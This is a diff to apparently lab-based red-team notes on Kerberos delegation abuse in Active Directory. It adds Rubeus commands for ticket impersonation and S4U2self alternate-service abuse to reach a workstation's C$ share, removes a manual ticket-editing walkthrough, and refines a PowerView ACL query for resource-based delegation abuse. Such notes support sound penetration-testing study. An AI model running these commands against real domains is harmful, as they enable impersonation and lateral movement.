@@ -406,6 +406,11 @@ Finally with mimikatz we can inject the ticket on the current session:
 ```
 .\Rubeus.exe ptt /ticket:TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_host~dcorp-mssql.dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi
 ```
+It is also possible to create a process with that Tiket in order to impersonate or steal the token with CobaltStrike.
+
+```
+.\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe \domain:DEV /username:Administrator /password:FakePass /ticket<base64>
+```
 
 > **Note**: If we have Constrained delegation on the DC we can ask to the `LDAP TGS` in order to do a `DCSync attack`.
 
@@ -414,85 +419,17 @@ Finally with mimikatz we can inject the ticket on the current session:
 
 Machines do not get remote local admin access to themserlver over CIFS, but we can abuse S4U2self to obtain a TGS to itself, as a user we know is a local admin
 
-If we obtain a TGT for a computer (there are different ways to obtain it without being admin for example using the Printer Bug), we can craft a TGS for CIFS.
+If we obtain a TGT for a computer (there are different ways to obtain it without being admin for example using the Printer Bug), we can craft a TGS for CIFS using the alternative service.
 
 ```
-.\Rubeus.exe s4u /user:WRKSTN-1$ /msdsspn:CIFS/WRKSTN-1.corp.local /impersonateuser:administrator /ticket:[B64_TGT_SRKSTN-1]
-[*] Action: S4U
-[*] Building S4U2self request for: 'WRKSTN-1.corp.local'
-[*] Using domain controller: dc.corp.local (10.10.10.10)
-[*] Sending S4U2self request to 10.10.10.10:88
-[+] S4U2self success!
-[*] Got a TGS for 'Administrator' to 'WRKSTN-1$@CORP.LOCAL'
-[*] base64(ticket.kirbi):
-
-      doIFdE [...snip...] MtMjQ=
-
-[*] Impersonating user 'Administrator' to target SPN 'CIFS/WRKSTN-1.corp.local'
-[*] Building S4U2proxy request for service: 'CIFS/WRKSTN-1.corp.local'
-[*] Using domain controller: dc.corp.local (10.10.10.10)
-[*] Sending S4U2proxy request to domain controller 10.10.10.10:88
-
-[X] KRB-ERROR (13) : KDC_ERR_BADOPTION
+.\Rubeus.exe s4u /impersonateuser:Administrator /self /altservice:CIFS/WRKSTN-1.corp.local /user:WRKSTN-1$ /ticket:[B64_TGT_SRKSTN-1]
+```
+Finally inject the TGS in memory and access to CIFS service.
 
 ```
-S4U2Proxy step will fail, but we can sotre the S4U2Self TGS to a file.
-
-```powershell
-PS C:\> [System.IO.File]::WriteAllBytes("C:\Tickets\wrkstn-1-s4u.kirbi", [System.Convert]::FromBase64String("doIFdE [...snip...] MtMjQ="))
+ls \\wrkstn-1.corp.local\c$
 ```
-
-We can use Rubeus `describe` module to see information about the ticket.
-
-```
-.\Rubeus describe /ticket:C:\Tickets\wrkstn-1-s4u.kirbi
-
-[*] Action: Describe Ticket
-
-  ServiceName              :  WRKSTN-1$
-  ServiceRealm             :  CORP.LOCAL
-  UserName                 :  Administrator
-  UserRealm                :  CORP.LOCAL
-  StartTime                :  9/30/2022 7:30:02 PM
-  EndTime                  :  11/30/2022 5:19:32 AM
-  RenewTill                :  1/1/0001 12:00:00 AM
-  Flags                    :  name_canonicalize, pre_authent, forwarded, forwardable
-  KeyType                  :  aes256_cts_hmac_sha1
-  Base64(key)              :  Vo7A9M7bwo7MvjKEkbmvaWcEn+RSeSU2RbsL42kT4p0=
-```
-As we can see, the `ServiceName` of  `WRKSTN-1$` is not valid for our use, remember that we want `CIFS` to access to the workstation filesystem. We can change it since the service name is not in the encrypted part of the ticket and is not checked.
-
-We can modify the ticket with `Asn1Editor`
-
-* [https://github.com/PKISolutions/Asn1Editor.WPF](https://github.com/PKISolutions/Asn1Editor.WPF)
-
-Find the two instances where the **GENERAL STRING "WRKSTN-1$"** appears and do the following in each instance.
-
-[IMAGE]
-
-Double-click them to open the `Node content editor` and replace these strings with `CIFS`. We also need to add an additional string node with the FQDN of the machine. Right-click on the parent `SEQUENCE` and select `New`. Enter `1b` in the `Tag (hex)` field and click `ok`. Finally double-click on the new node to edit the text.
-
-[IMAGE]
-
-Save the modified ticket and use `describe` Rubeus module again to check if is correctly changed.
-
-```
-.\Rubeus.exe describe /ticket:C:\Users\Administrator\Desktop\wkstn-2-s4u.kirbi
-
-[*] Action: Describe Ticket
-
-  ServiceName              :  cifs/wrkstn-1.corp.local
-  ServiceRealm             :  CORP.LOCAL
-  UserName                 :  Administrator
-  UserRealm                :  CORP.LOCAL
-  StartTime                :  9/30/2022 7:30:02 PM
-  EndTime                  :  11/30/2022 5:19:32 AM
-  RenewTill                :  1/1/0001 12:00:00 AM
-  Flags                    :  name_canonicalize, pre_authent, forwarded, forwardable
-  KeyType                  :  aes256_cts_hmac_sha1
-  Base64(key)              :  Vo7A9M7bwo7MvjKEkbmvaWcEn+RSeSU2RbsL42kT4p0=
-```
-Finally we can inject ticket on memory and access succesfully to the CIFS service.
+> **Note**: Make sure to use FQDN. 
 
 ## Mitigation
 
@@ -514,9 +451,11 @@ RBCD reverses this concept and puts control in the hands of the backend via the 
 
 > **Note**: We are going to abuse `WriteProperty`, `GenericAll`, `GenericWrite` or `WriteDacl` rights on a computer to add RBCD delegation attribute, then perform S4U and compromise the target machine.
 
+> **Note**: See the `ObjectAceType` to make sure that we have `WritePoperty` rights in all properties (`All`)
+
 * PowerView (dev):
 ```powershell
-Get-DomainComputer | Get-DomainObjectDacl -ResolveGUIDs |  ?{$_.ActiveDirectoryRights -match "WriteProperty|GenericWrite|GenericAll|WriteDacl" -and $_.SecurityIdentifier -match "S-1-5-21-569305411-121244042-2357301523-[\d]{4,10}"}
+Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs |  ?{$_.ActiveDirectoryRights -match "WriteProperty|GenericWrite|GenericAll|WriteDacl" -and $_.SecurityIdentifier -match "S-1-5-21-569305411-121244042-2357301523-[\d]{4,10}"}
 ```
 
 We need to use a computer account, we can use one we have compromised or we can join a fake one to the domain.
